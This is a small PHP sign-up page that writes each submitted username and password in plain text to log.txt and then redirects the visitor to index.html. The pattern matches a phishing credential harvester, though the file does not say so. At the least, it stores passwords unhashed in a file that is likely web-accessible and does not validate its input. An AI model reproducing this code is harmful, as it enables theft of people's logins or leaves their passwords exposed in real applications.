<html>
 <head>
  <title>SignUp</title>
 </head>
 <body>

<?php

//If Submit Button Is Clicked Do the Following
if ($_POST['Sign Up']){

$myFile = "log.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = $_POST['username'] . ":";
fwrite($fh, $stringData);
$stringData = $_POST['password'] . "\n";
fwrite($fh, $stringData);
fclose($fh);

} ?>


//goes here after
<script>location.href='./index.html';</script>
	 
 </body>
</html>